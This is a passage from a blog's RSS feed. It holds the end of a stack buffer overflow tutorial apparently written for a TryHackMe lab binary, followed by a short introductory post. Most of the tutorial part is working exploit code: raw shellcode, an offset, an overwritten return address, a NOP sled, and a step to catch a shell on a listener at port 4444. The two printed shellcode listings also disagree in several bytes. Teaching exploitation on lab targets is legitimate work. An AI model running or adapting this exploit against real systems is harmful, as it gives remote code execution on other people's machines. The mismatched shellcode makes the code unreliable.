&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbc\xd8\xd5\xf4\xb0\xf4\xda\xbd\x7f\x23\xd5\x3e\xd3\x17\x74&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbd\x2e\x44\x56\xfc\xe0\x99\x97\x39\x1c\x53\xc5\x92\x6a\xc6&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf9\x97\x27\xdb\x72\xeb\xa6\x5b\x67\xbc\xc9\x4a\x36\xb6\x93&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x4c\xb9\x1b\xa8\xc4\xa1\x78\x95\x9f\x5a\x4a\x61\x1e\x8a\x82&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8a\x8d\xf3\x2a\x79\xcf\x34\x8c\x62\xba\x4c\xee\x1f\xbd\x8b&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8c\xfb\x48\x0f\x36\x8f\xeb\xeb\xc6\x5c\x6d\x78\xc4\x29\xf9&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x26\xc9\xac\x2e\x5d\xf5\x25\xd1\xb1\x7f\x7d\xf6\x15\xdb\x25&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x97\x0c\x81\x88\xa8\x4e\x6a\x74\x0e\x05\x87\x61\x3c\x44\xc0&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x46\x0d\x76\x10\xc1\x06\x05\x22\x4e\xbd\x81\x0e\x07\x1b\x56&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x70\x32\xdb\xc8\x8f\xbd\x1c\xc1\x4b\xe9\x4c\x79\x7d\x92\x06&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x79\x82\x47\x88\x29\x2c\x38\x67\x99\x8c\xe8\x01\xf3\x02\xd6&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x32\xfc\xc8\x7f\xd8\x07\x9b\x75\x15\x65\xe6\xe2\x27\x69\x09&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xaf\xae\x8f\x43\x5f\xe7\x18\xfc\xc6\xa2\xd2\x9d\x07\x79\x9f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x9e\x8c\x8e\x60\x50\x65\xfa\x72\x05\x85\xb1\x28\x80\x9a\x6f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x44\x4e\x08\xf4\x94\x19\x31\xa3\xc3\x4e\x87\xba\x81\x62\xbe&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x14\xb7\x7e\x26\x5e\x73\xa5\x9b\x61\x7a\x28\xa7\x45\x6c\xf4&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x28\xc2\xd8\xa8\x7e\x9c\xb6\x0e\x29\x6e\x60\xd9\x86\x38\xe4&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x9c\xe4\xfa\x72\xa1\x20\x8d\x9a\x10\x9d\xc8\xa5\x9d\x49\xdd&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xde\xc3\xe9\x22\x35\x40\x09\xc1\x9f\xbd\xa2\x5c\x4a\x7c\xaf&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5e\xa1\x43\xd6\xdc\x43\x3c\x2d\xfc\x26\x39\x69\xba\xdb\x33&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe2\x2f\xdb\xe0\x03\x7a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We will append this at the end of our payload. Now we're still missing one final piece of the puzzle. If our payload misses the ESP pointer by one byte it wont execute.&lt;/p&gt;
&lt;p&gt;It's generally good practice to add 8 or 16 bytes of &lt;code&gt;\x90&lt;/code&gt;, or No Operation (NOP) bytes as padding before our payload. This is what's called a NOP Sled. If ESP points anywhere at our NOP sled it'll still execute our payload.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NOP sleds are usually more important when dealing with ASLR protections, as the size of a NOP sled increases the probability that we'll be able to execute our payload.&lt;br&gt; Once again for more information on this &lt;a href="https://github.com/r0hi7/BinExp"&gt;https://github.com/r0hi7/BinExp&lt;/a&gt; is a great source.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So finally our payload should look something like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2026&lt;/span&gt;
&lt;span class="n"&gt;overflow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;
&lt;span class="n"&gt;EIP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xaf\x11\x50\x62&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;padding&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;
&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x10\xff\xf0\x86\x99\x1a\xc1\x86\xfe\x6f\x72\x37\x74\x3d\x7f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbc\xd8\xd5\xf4\xb0\xf4\xda\xbd\x7f\x23\xd5\x3e\xd3\x17\x74&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xbd\x2e\x44\x56\xfc\xe0\x99\x97\x39\x1c\x53\xc5\x92\x6a\xc6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf9\x97\x27\xdb\x72\xeb\xa6\x5b\x67\xbc\xc9\x4a\x36\xb6\x93&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x4c\xb9\x1b\xa8\xc4\xa1\x78\x95\x9f\x5a\x4a\x61\x1e\x8a\x82&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8a\x8d\xf3\x2a\x79\xcf\x34\x8c\x62\xba\x4c\xee\x1f\xbd\x8b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8c\xfb\x48\x0f\x36\x8f\xeb\xeb\xc5\x5c\x6d\x78\xc4\x29\xf9&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x26\xc9\xac\x2e\x5d\xf5\x25\xd1\xb1\x7f\x7d\xf6\x15\xdb\x25&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x97\x0c\x81\x88\xa8\x4e\x6a\x74\x0d\x05\x87\x61\x3c\x44\xc0&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x46\x0d\x76\x10\xc1\x06\x05\x20\x4e\xbd\x81\x0e\x07\x1b\x56&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x70\x32\xdb\xc8\x8f\xbd\x1c\xc1\x4b\xe9\x4c\x79\x7d\x92\x06&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x79\x82\x47\x88\x30\x2c\x38\x69\x99\x8c\xe8\x01\xf3\x02\xd6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x32\xfc\xc8\x7f\xd8\x07\x9b\x75\x15\x65\xe6\xe2\x27\x69\x09&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xaf\xae\x8f\x43\x5f\xe7\x18\xfc\xc6\xa2\xd2\x9d\x07\x79\x9f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x9e\x8c\x8e\x60\x50\x65\xfa\x72\x05\x85\xb1\x28\x80\x9a\x6f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x44\x4e\x08\xf4\x94\x1f\x31\xa2\xc3\x4e\x87\xba\x81\x62\xbe&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x14\xb7\x7e\x26\x5e\x73\xa5\x9b\x61\x7a\x28\xa7\x45\x6c\xf4&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x28\xc2\xd8\xa8\x7e\x9c\xb6\x0e\x29\x6e\x60\xd9\x86\x38\xe4&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x9c\xe4\xfa\x72\xa1\x20\x8d\x9a\x10\x9d\xc8\xa5\x9d\x49\xdd&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xde\xc3\xe9\x22\x35\x40\x09\xc1\x9f\xbd\xa2\x5c\x4a\x7c\xaf&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5e\xa1\x43\xd6\xdc\x43\x3c\x2d\xfc\x26\x39\x69\xba\xdb\x33&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe2\x2f\xdb\xe0\x03\x7a&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;overflow&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;EIP&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;padding&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;Getting a Shell&lt;/h3&gt;
&lt;p&gt;All we have to do now is set up a listener on port 4444, and execute our exploit.&lt;/p&gt;
&lt;p&gt;This should work on any target with a similar configuration because essfunc.dll has no protections.&lt;/p&gt;
&lt;h2&gt;Final Words&lt;/h2&gt;
&lt;p&gt;This may have seemed extremely long, but as you saw throughout this, we built a nice little exploit out of it. And this exploit becomes really adaptable, we reuse it for future similar overflows. &lt;/p&gt;
&lt;p&gt;Play around with it and soon it will only take you a few minutes to get a working exploit on a given buffer overflow. In fact you could turn all of this into a script and automate most of it.&lt;/p&gt;
&lt;p&gt;With this knowledge you can do all the overflow rooms in THM's Offensive Pentesting path. Have fun with those.&lt;/p&gt;
&lt;p&gt;But this is just scratching the surface of Buffer Overflows, there's more we can do, as I alluded earlier. If you want to take a look at x64 architecture buffer overflows and how you can use them to control variables, call other functions etc. in linux please go do the &lt;a href="https://tryhackme.com/room/bof1"&gt;Buffer Overflows room&lt;/a&gt;. The &lt;a href="https://tryhackme.com/room/thecodcaper"&gt;Cod Caper room&lt;/a&gt; also give you an overview of how this knowledge can be used in a privilege escalation scenario as well as how to use the pwntools python library.&lt;/p&gt;
&lt;p&gt;If you're looking to know more about binary exploitation I do recommend the github I've been sharing so far: &lt;a href="https://github.com/r0hi7/BinExp"&gt;https://github.com/r0hi7/BinExp&lt;/a&gt;, it is Linux x64 focused but the concepts are not too dissimilar.&lt;/p&gt;
&lt;p&gt;Information there is pretty detailed and easy to understand, and has plenty of practical examples.&lt;/p&gt;
&lt;p&gt;Additionally if you want to learn more about assembly and reverse engineering check out the &lt;a href="https://tryhackme.com/room/introtox8664"&gt;Intro to 86-64 room&lt;/a&gt; on tryHackMe. There is plenty to learn from.&lt;/p&gt;
&lt;p&gt;Be bold, play around, hack the planet.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">OmegaVoid</dc:creator><pubDate>Sat, 06 Mar 2021 12:00:00 +0000</pubDate><guid isPermaLink="false">tag:None,2021-03-06:/binexp-corner-1-bofs.html</guid><category>Tutorials</category><category>tutorial</category><category>binexp</category><category>buffer overflows</category></item><item><title>Hello World</title><link>/hello-world.html</link><description>&lt;p&gt;This is the mandatory "hello world" post that any creator must go through. Welcome to my first blog.&lt;/p&gt;
&lt;p&gt;Let's figure this out and make it work. &lt;/p&gt;
&lt;p&gt;We've got some pretty interesting stuff coming up soon. Keep an eye out because we'll have a tutorial up on Saturday March 6th.&lt;/p&gt;
&lt;p&gt;We'll have a talk about Stack Buffer Overflows on the &lt;a href="https://discord.com/invite/tryhackme"&gt;TryHackMe discord&lt;/a&gt;.
Hopefully we'll help some people who are a bit more reticent about trying Buffer Overflows to just smash through them and get them done.&lt;/p&gt;
&lt;p&gt;Tune in on Saturday for an update.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">OmegaVoid</dc:creator><pubDate>Fri, 05 Mar 2021 12:00:00 +0000</pubDate><guid isPermaLink="false">tag:None,2021-03-05:/hello-world.html</guid><category>Rants</category><category>rants</category></item></channel></rss>